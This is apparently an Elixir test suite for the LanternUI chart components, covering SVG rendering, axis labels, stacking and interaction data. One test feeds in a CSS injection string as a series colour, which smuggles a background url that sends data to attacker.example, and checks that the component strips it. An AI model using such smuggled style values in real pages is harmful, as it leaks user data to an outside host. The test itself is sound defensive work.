defmodule LanternUI.ChartsTest do
  use ExUnit.Case, async: true

  import Phoenix.LiveViewTest

  defp area(series, opts \\ []) do
    render_component(
      &LanternUI.Charts.area_chart/1,
      Keyword.merge([id: "c", series: series], opts)
    )
  end

  # The value axis labels: the right-anchored text that is a number (the last
  # date label is right-anchored too).
  defp y_labels(html) do
    ~r/text-anchor="end"[^>]*>\s*([^<]*?)\s*</
    |> Regex.scan(html, capture: :all_but_first)
    |> List.flatten()
    |> Enum.filter(&(&1 =~ ~r/^-?[\d.]+$/))
  end

  describe "area_chart/1" do
    test "renders an svg and embeds the point list for sparse series" do
      html =
        area([
          %{date: "2024-01-01", value: 10.0},
          %{date: "2024-02-01", value: 12.5},
          %{date: "2024-03-01", value: 9.0}
        ])

      assert html =~ "<svg"
      assert html =~ "<path"
      assert html =~ "data-points"
      assert html =~ "phx-hook=\"ChartHover\""
    end

    test "dense series still renders a path and points" do
      series =
        for i <- 0..119 do
          %{
            date: Date.to_iso8601(Date.add(~D[2023-01-01], i * 3)),
            value: 10.0 + :math.sin(i / 5) * 3
          }
        end

      html = area(series)
      assert html =~ "<path"
      assert html =~ "data-points"
    end

    test "empty series renders the empty state, no svg" do
      html = area([])
      assert html =~ "No data"
      refute html =~ "<svg"
    end

    # A count per month is never negative and never a fraction; the axis used
    # to read -1, -0.5, 0, 0.5, 1 under a year of zeros.
    test "a series of zero counts gets a 0-based axis in whole numbers" do
      html = area(for m <- 1..12, do: %{date: Date.new!(2024, m, 1), value: 0})

      assert y_labels(html) == ["0", "1"]
    end

    test "positive counts start the axis at zero, not at their minimum" do
      html = area([%{date: "2024-01-01", value: 4}, %{date: "2024-02-01", value: 6}])

      assert hd(y_labels(html)) == "0"
      refute Enum.any?(y_labels(html), &String.contains?(&1, "."))
    end

    test "currency formatting reaches the labels" do
      html =
        area(
          [%{date: "2024-01-01", value: 10.0}, %{date: "2024-02-01", value: 20.0}],
          value_format: :currency
        )

      assert html =~ "$"
    end
  end

  describe "sparkline/1" do
    test "renders an svg path" do
      html = render_component(&LanternUI.Charts.sparkline/1, id: "s", series: [1, 2, 3, 2, 4])
      assert html =~ "<svg"
      assert html =~ "<path"
    end

    test "empty series renders nothing" do
      html = render_component(&LanternUI.Charts.sparkline/1, id: "s", series: [])
      refute html =~ "<svg"
    end
  end

  describe "bar_chart/1" do
    test "renders bars and labels" do
      html =
        render_component(&LanternUI.Charts.bar_chart/1,
          id: "b",
          series: [%{label: "Q1", value: 42}, %{label: "Q2", value: 31}]
        )

      assert html =~ "<rect"
      assert html =~ "Q1"
    end

    test "empty series renders the empty state" do
      html = render_component(&LanternUI.Charts.bar_chart/1, id: "b", series: [])
      assert html =~ "No data"
    end

    test "a category with an href becomes a live link over the whole column" do
      html =
        render_component(&LanternUI.Charts.bar_chart/1,
          id: "b",
          series: [
            %{label: "Open", value: 12, href: "/orders?status=open"},
            %{label: "Shipped", value: 0, href: "/orders?status=shipped"}
          ]
        )

      assert html =~ ~s(href="/orders?status=open")
      assert html =~ ~s(data-phx-link="redirect")
      assert html =~ ~s(aria-label="Open: 12")
      # The category sitting at zero draws no bar, so its column is the only
      # thing there is to click.
      assert html =~ ~s(aria-label="Shipped: 0")
      assert html =~ ~s(fill="transparent")
    end

    test "a category without an href is drawn as a plain bar" do
      html =
        render_component(&LanternUI.Charts.bar_chart/1,
          id: "b",
          series: [%{label: "Q1", value: 42}]
        )

      refute html =~ "lui-bar-link"
      refute html =~ "<a"
    end
  end

  describe "line_chart/1" do
    test "renders multi-series lines, legend, and the embedded point list" do
      series = [
        %{
          label: "web-1",
          color: "var(--color-primary)",
          points: [{~U[2024-01-01 00:00:00Z], 0.2}, {~U[2024-01-01 00:05:00Z], 0.4}]
        },
        %{
          label: "web-2",
          points: [{~U[2024-01-01 00:00:00Z], 0.1}, {~U[2024-01-01 00:05:00Z], 0.3}]
        }
      ]

      html = render_component(&LanternUI.Charts.line_chart/1, id: "l", series: series)
      assert html =~ "<svg"
      assert html =~ "phx-hook=\"LineHover\""
      assert html =~ "data-series"
      assert html =~ "web-1"
      assert html =~ "web-2"
      assert html =~ "var(--color-primary)"
    end

    test "accepts %{time, value} maps and ISO-8601 strings" do
      series = [
        %{
          label: "a",
          points: [
            %{time: "2024-01-01T00:00:00Z", value: 1},
            %{time: "2024-01-01T01:00:00Z", value: 2}
          ]
        }
      ]

      html = render_component(&LanternUI.Charts.line_chart/1, id: "l", series: series)
      assert html =~ "<path"
      assert html =~ "data-series"
    end

    test "empty series renders the empty state, no svg" do
      html = render_component(&LanternUI.Charts.line_chart/1, id: "l", series: [])
      assert html =~ "No data"
      refute html =~ "<svg"
    end
  end

  describe "time_series_chart/1" do
    test "legacy chart functions keep their established SVG signatures" do
      area_html = area([%{date: "2024-01-01", value: 2}, %{date: "2024-01-02", value: 4}])

      sparkline_html =
        render_component(&LanternUI.Charts.sparkline/1, id: "legacy-spark", series: [1, 2, 3])

      bar_html =
        render_component(&LanternUI.Charts.bar_chart/1,
          id: "legacy-bar",
          series: [%{label: "A", value: 2}, %{label: "B", value: 4}]
        )

      line_html =
        render_component(&LanternUI.Charts.line_chart/1,
          id: "legacy-line",
          series: [
            %{
              label: "A",
              color: "var(--lantern-primary)",
              points: [{~U[2024-01-01 00:00:00Z], 2}, {~U[2024-01-02 00:00:00Z], 4}]
            }
          ]
        )

      assert area_html =~ ~s(id="c-hover" phx-hook="ChartHover")
      assert area_html =~ ~s(id="c-grad")
      assert area_html =~ ~s(stroke-width="1.5")
      assert sparkline_html =~ ~s(id="legacy-spark")
      assert sparkline_html =~ ~s(viewBox="0 0 160 40")
      assert sparkline_html =~ ~s(stroke-width="1.75")
      assert bar_html =~ ~s(aria-label="Bar chart")
      assert bar_html =~ "<rect"
      assert line_html =~ ~s(id="legacy-line-hover" phx-hook="LineHover")
      assert line_html =~ "var(--lantern-primary)"
      assert line_html =~ ~s(stroke-width="1.75")
    end

    test "renders the additive series-first contract with a signed zero axis" do
      html =
        render_component(&LanternUI.Charts.time_series_chart/1,
          id: "generic",
          aria_label: "Portfolio value",
          series: [
            %{
              id: :collection,
              label: "Collection",
              points: [%{x: ~D[2026-01-01], y: -4}, %{x: ~D[2026-03-01], y: 8}]
            },
            %{
              id: :inventory,
              label: "Inventory",
              points: [
                %{x: ~D[2026-01-01], y: 2},
                %{x: ~D[2026-02-01], y: 3},
                %{x: ~D[2026-03-01], y: 5}
              ]
            }
          ],
          curve: :monotone
        )

      assert html =~ ~s(id="generic")
      assert html =~ ~s(aria-label="Portfolio value")
      assert html =~ ~s(phx-hook="ChartInteraction")
      assert html =~ "View chart data"
      assert html =~ "<caption>Portfolio value data table</caption>"
      assert html =~ ~s(aria-live="polite")
      assert html =~ "Collection"
      assert html =~ "Inventory"
      assert html =~ ~s(class="lui-time-series-chart__zero")
      assert html =~ "C"
      refute html =~ ~r/NaN|Infinity|nan|inf/
      refute html =~ "data-select-event"
      refute html =~ "lui-time-series-chart__reference"
      refute html =~ "data-series-id="

      interaction =
        html
        |> Floki.parse_fragment!()
        |> Floki.find("#generic")
        |> Floki.attribute("data-interaction")
        |> hd()
        |> Jason.decode!()

      refute Map.has_key?(hd(interaction), "x_value")
      refute Map.has_key?(hd(interaction), "raw_values")
    end

    test "selection event receives raw x and series values; reference lines reach the table" do
      html =
        render_component(&LanternUI.Charts.time_series_chart/1,
          id: "selectable",
          type: :bar,
          select_event: "select_date",
          hover_event: "hover_date",
          reference_lines: [%{label: "Average", value: 12}],
          series: [
            %{
              id: :sales,
              label: "Sales",
              points: [%{x: ~D[2026-01-01], y: 8}, %{x: ~D[2026-02-01], y: 16}]
            },
            %{id: :orders, label: "Orders", points: [%{x: ~D[2026-01-01], y: 2}]}
          ]
        )

      assert html =~ ~s(data-select-event="select_date")
      assert html =~ ~s(data-hover-event="hover_date")
      assert html =~ ~s(data-series-id="[&quot;sales&quot;,&quot;orders&quot;]")

      interaction =
        html
        |> Floki.parse_fragment!()
        |> Floki.find("#selectable")
        |> Floki.attribute("data-interaction")
        |> hd()
        |> Jason.decode!()

      assert Enum.at(interaction, 0)["x_value"] == "2026-01-01"
      assert Enum.at(interaction, 0)["raw_values"] == [8, 2]
      assert Enum.at(interaction, 1)["raw_values"] == [16, nil]
      assert html =~ "lui-time-series-chart__reference"

      assert File.read!("priv/static/lantern_ui.css") =~
               ".lui-time-series-chart__reference line { stroke: var(--lantern-accent); stroke-dasharray: 5 4;"

      assert html =~ "Average"
      assert html =~ "12"
      assert html =~ "<tfoot>"
      refute html =~ ~r/NaN|Infinity|nan|inf/
    end

    test "missing x keys break a path instead of connecting across the gap" do
      html =
        render_component(&LanternUI.Charts.time_series_chart/1,
          id: "sparse",
          series: [
            %{id: "a", label: "Sparse", points: [%{x: 1, y: 2}, %{x: 3, y: 4}]},
            %{id: "b", label: "Complete", points: [%{x: 1, y: 1}, %{x: 2, y: 2}, %{x: 3, y: 3}]}
          ]
        )

      assert length(Regex.scan(~r/class="lui-time-series-chart__line"/, html)) == 3
    end

    test "invalid points render a deterministic empty state" do
      html =
        render_component(&LanternUI.Charts.time_series_chart/1,
          id: "invalid",
          series: [%{id: "a", label: "Invalid", points: [%{x: nil, y: 1}, %{x: 2, y: :bad}]}]
        )

      assert html =~ "No data"
      refute html =~ "<svg"
    end

    test "heterogeneous x domains raise a clear error instead of hiding data" do
      assert_raise ArgumentError,
                   ~r/homogeneous x domain.*mixed domains: numbers, category strings/,
                   fn ->
                     render_component(&LanternUI.Charts.time_series_chart/1,
                       id: "mixed",
                       series: [
                         %{id: "a", label: "Numbers", points: [%{x: 1, y: 2}]},
                         %{id: "b", label: "Categories", points: [%{x: "Apr", y: 3}]}
                       ]
                     )
                   end
    end

    test "SSR chart has uniform aspect ratio and caller dimensions" do
      html =
        render_component(&LanternUI.Charts.time_series_chart/1,
          id: "sized",
          width: 480,
          height: 300,
          series: [%{id: "a", label: "A", points: [%{x: "Jan", y: 2}]}]
        )

      assert html =~ ~s(viewBox="0 0 480 300")
      assert html =~ ~s(preserveAspectRatio="xMinYMin meet")
      assert html =~ ~s(style="--lui-chart-height:300px")
      refute html =~ ~s(preserveAspectRatio="none")
    end

    test "Date and DateTime x values use the same Unix epoch" do
      html =
        render_component(&LanternUI.Charts.time_series_chart/1,
          id: "same-instant",
          series: [
            %{id: "date", label: "Date", points: [%{x: ~D[1970-01-01], y: 1}]},
            %{id: "datetime", label: "DateTime", points: [%{x: ~U[1970-01-01 00:00:00Z], y: 2}]},
            %{
              id: "naive-datetime",
              label: "NaiveDateTime",
              points: [%{x: ~N[1970-01-01 00:00:00], y: 3}]
            }
          ]
        )

      x_coordinates =
        Regex.scan(~r/<path d="M([^,]+),/, html, capture: :all_but_first)
        |> List.flatten()

      assert x_coordinates == ["496.0", "496.0", "496.0"]
    end

    test "stacked area omits empty sign bands so the zero line stays visible" do
      html =
        render_component(&LanternUI.Charts.time_series_chart/1,
          id: "positive-stack",
          type: :stacked_area,
          series: [%{id: "a", label: "Positive", points: [%{x: "Apr", y: 2}, %{x: "May", y: 4}]}]
        )

      assert length(Regex.scan(~r/class="lui-time-series-chart__area"/, html)) == 1
      assert length(Regex.scan(~r/class="lui-time-series-chart__zero"/, html)) == 1
      refute html =~ "lui-time-series-chart__line"
    end

    test "an all-zero stacked area still renders its valid data and zero axis" do
      html =
        render_component(&LanternUI.Charts.time_series_chart/1,
          id: "zero-stack",
          type: :stacked_area,
          series: [%{id: "a", label: "Zero", points: [%{x: "Apr", y: 0}, %{x: "May", y: 0}]}]
        )

      assert html =~ "<svg"
      assert html =~ "lui-time-series-chart__zero"
      refute html =~ "lui-time-series-chart__area"
      refute html =~ "No data"
    end

    test "single-series sign keeps the caller color and adds a dashed negative cue" do
      html =
        render_component(&LanternUI.Charts.time_series_chart/1,
          id: "signed-custom-color",
          series: [
            %{
              id: "custom",
              label: "Custom",
              color: "var(--lantern-chart-1)",
              points: [%{x: "Apr", y: -2}, %{x: "May", y: 2}]
            }
          ]
        )

      assert String.contains?(html, "--lui-series-color:var(--lantern-chart-1)")
      assert String.contains?(html, "stroke-dasharray=\"4 2\"")
      assert html =~ "lui-time-series-chart__gain-negative"
      refute html =~ "var(--lantern-success)"
      refute html =~ "var(--lantern-danger)"
    end

    test "single-series sign keeps semantic colors when no custom color is supplied" do
      html =
        render_component(&LanternUI.Charts.time_series_chart/1,
          id: "signed-default-color",
          series: [%{id: "a", label: "A", points: [%{x: 1, y: -2}, %{x: 2, y: 2}]}]
        )

      assert html =~ "--lui-series-color:var(--lantern-success)"
      assert html =~ "--lui-series-color:var(--lantern-danger)"
      assert html =~ "stroke-dasharray=\"4 2\""
    end

    test "series colors accept only a single CSS custom-property reference" do
      html =
        render_component(&LanternUI.Charts.time_series_chart/1,
          id: "unsafe-series-color",
          type: :points,
          series: [
            %{
              id: "a",
              label: "A",
              color: "var(--x);background:url(https://attacker.example/?data=...) ",
              points: [%{x: 1, y: 2}]
            }
          ]
        )

      assert html =~ "--lui-series-color:var(--lantern-chart-1,"
      refute html =~ "attacker.example"
      refute html =~ "background:url"
    end

    test "horizontal orientation does not rotate line-chart annotations" do
      html =
        render_component(&LanternUI.Charts.time_series_chart/1,
          id: "vertical-line-annotation",
          type: :line,
          orientation: :horizontal,
          series: [
            %{
              id: "a",
              label: "A",
              points: [%{x: "Apr", y: 1}, %{x: "May", y: 2}, %{x: "Jun", y: 3}]
            }
          ],
          annotations: [%{id: "launch", x: "May", label: "Launch"}]
        )

      assert String.contains?(html, "x1=\"496.0\" x2=\"496.0\"")
      assert html =~ "Launch"
    end

    test "the points mode renders glyphs without connecting paths" do
      html =
        render_component(&LanternUI.Charts.time_series_chart/1,
          id: "points",
          type: :points,
          series: [%{id: "a", label: "A", points: [%{x: 1, y: -1}, %{x: 2, y: 2}]}]
        )

      assert html =~ "lui-time-series-chart__point"
      refute html =~ "lui-time-series-chart__line"
    end

    test "diverging stacked area closes every series band and includes both signs" do
      html =
        render_component(&LanternUI.Charts.time_series_chart/1,
          id: "stacked-area",
          type: :stacked_area,
          curve: :cardinal,
          series: [
            %{
              id: "a",
              label: "A",
              points: [%{x: "Apr", y: 5}, %{x: "May", y: -3}, %{x: "Jun", y: 4}]
            },
            %{id: "b", label: "B", points: [%{x: "Apr", y: -2}, %{x: "Jun", y: -6}]}
          ]
        )

      bands =
        Regex.scan(~r/<path d="([^"]+)" class="lui-time-series-chart__area"/, html,
          capture: :all_but_first
        )

      assert length(bands) == 4

      assert Enum.all?(bands, fn [d] ->
               String.ends_with?(d, "Z") and not Regex.match?(~r/NaN|Infinity/, d)
             end)

      assert html =~ ">\n        -"
      assert html =~ ">\n        0\n"
      assert html =~ " >\n        5\n" or html =~ ">\n        5\n"
    end

    test "stacked area and bar interaction markers use their visible stack coordinates" do
      series = [
        %{id: "a", label: "A", points: [%{x: "Apr", y: 10}]},
        %{id: "b", label: "B", points: [%{x: "Apr", y: 20}]}
      ]

      for type <- [:stacked_area, :stacked_bar] do
        html =
          render_component(&LanternUI.Charts.time_series_chart/1,
            id: "stacked-hover-#{type}",
            type: type,
            series: series
          )

        [encoded] =
          html
          |> Floki.parse_fragment!()
          |> Floki.attribute("#stacked-hover-#{type}", "data-interaction")

        [point] = Jason.decode!(encoded)
        [first, second] = point["positions"]

        assert first["x"] == second["x"]
        assert first["y"] != second["y"]
        assert second["y"] < first["y"]
      end
    end

    test "single-series area splits its fill at interpolated and explicit zero crossings" do
      for {id, values} <- [{"interpolated", [-3, 3]}, {"explicit", [-3, 0, 3]}] do
        points =
          values
          |> Enum.with_index()
          |> Enum.map(fn {y, index} -> %{x: "Month #{index}", y: y} end)

        html =
          render_component(&LanternUI.Charts.time_series_chart/1,
            id: "crossing-area-#{id}",
            type: :area,
            series: [%{id: "gain", label: "Gain", points: points}]
          )

        assert html =~ "lui-time-series-chart__gain-negative"
        assert html =~ "lui-time-series-chart__gain-positive"

        areas =
          Regex.scan(~r/<path d="([^"]+)" class="lui-time-series-chart__area"/, html,
            capture: :all_but_first
          )

        assert length(areas) == 2

        assert Enum.all?(areas, fn [d] ->
                 String.ends_with?(d, "Z") and not Regex.match?(~r/NaN|Infinity/, d)
               end)
      end
    end

    test "grouped and stacked bars support both orientations with finite geometry" do
      series = [
        %{id: "a", label: "A", points: [%{x: "Apr", y: 5}, %{x: "May", y: -3}]},
        %{id: "b", label: "B", points: [%{x: "Apr", y: -2}, %{x: "Jun", y: 4}]}
      ]

      for {type, orientation} <- [
            grouped_bar: :vertical,
            stacked_bar: :vertical,
            grouped_bar: :horizontal
          ] do
        html =
          render_component(&LanternUI.Charts.time_series_chart/1,
            id: "bars-#{type}-#{orientation}",
            type: type,
            orientation: orientation,
            series: series
          )

        assert html =~ "lui-time-series-chart__bar"
        assert html =~ "lui-time-series-chart__zero"
        refute html =~ ~r/NaN|Infinity|nan|inf/
      end
    end

    test "comparison paths and annotations align to primary x keys" do
      html =
        render_component(&LanternUI.Charts.time_series_chart/1,
          id: "comparison",
          series: [%{id: "a", label: "Current", points: [%{x: "Apr", y: 2}, %{x: "May", y: 5}]}],
          comparison: [
            %{id: "a", label: "Previous", points: [%{x: "Apr", y: 1}, %{x: "May", y: 3}]}
          ],
          annotations: [%{id: "launch", x: "May", label: "Launch", tone: :warning}]
        )

      assert html =~ "lui-time-series-chart__comparison"
      assert html =~ "stroke-dasharray"
      assert html =~ "lui-time-series-chart__annotation"
      assert html =~ "Launch"
      assert html =~ "tone-warning"
      assert html =~ "Current: 2"
      assert html =~ "Previous: 1"
    end

    test "selection values keep comparison values under a distinct key" do
      html =
        render_component(&LanternUI.Charts.time_series_chart/1,
          id: "comparison-selection",
          select_event: "select_date",
          series: [%{id: "collection", label: "Current", points: [%{x: ~D[2026-01-01], y: 10}]}],
          comparison: [
            %{id: "collection", label: "Previous", points: [%{x: ~D[2026-01-01], y: 7}]}
          ]
        )

      root = html |> Floki.parse_fragment!() |> Floki.find("#comparison-selection") |> hd()
      ids = root |> Floki.attribute("data-series-id") |> hd() |> Jason.decode!()
      interaction = root |> Floki.attribute("data-interaction") |> hd() |> Jason.decode!()

      assert ids == ["collection", "comparison:collection:1"]
      assert hd(interaction)["raw_values"] == [10, 7]
      assert hd(interaction)["x_value"] == "2026-01-01"
    end

    test "comparison-only x keys do not extend the primary axis" do
      html =
        render_component(&LanternUI.Charts.time_series_chart/1,
          id: "comparison-extra-key",
          series: [
            %{id: "current", label: "Current", points: [%{x: "Apr", y: 2}, %{x: "May", y: 5}]}
          ],
          comparison: [
            %{
              id: "previous",
              label: "Previous",
              points: [%{x: "Apr", y: 1}, %{x: "May", y: 3}, %{x: "Jun", y: 4}]
            }
          ]
        )

      assert html =~ "Apr"
      assert html =~ "May"
      refute html =~ "Jun"
    end
  end

  describe "area_chart smoothing and axis labels" do
    @monthly [
      %{date: "2025-10-01", value: 0},
      %{date: "2025-11-01", value: 0},
      %{date: "2025-12-01", value: 5},
      %{date: "2026-01-01", value: 0}
    ]

    defp line_path(html) do
      [_, d] = Regex.run(~r/<path\s+d="([^"]+)"\s+fill="none"/, html)
      d
    end

    defp x_tick_anchors(html) do
      ~r/<text[^>]*y="\d+"[^>]*text-anchor="(\w+)"[^>]*>\s*[A-Z][a-z]{2}/
      |> Regex.scan(html)
      |> Enum.map(&List.last/1)
    end

    test "smooths the line by default" do
      assert line_path(area(@monthly)) =~ "C"
    end

    test "smooth={false} draws straight segments, so empty months stay flat" do
      d = line_path(area(@monthly, smooth: false))

      refute d =~ "C"
      assert d =~ "L"
    end

    test "the first and last x labels anchor inward so they cannot clip" do
      assert ["start" | rest] = x_tick_anchors(area(@monthly))
      assert List.last(rest) == "end"
    end
  end
end
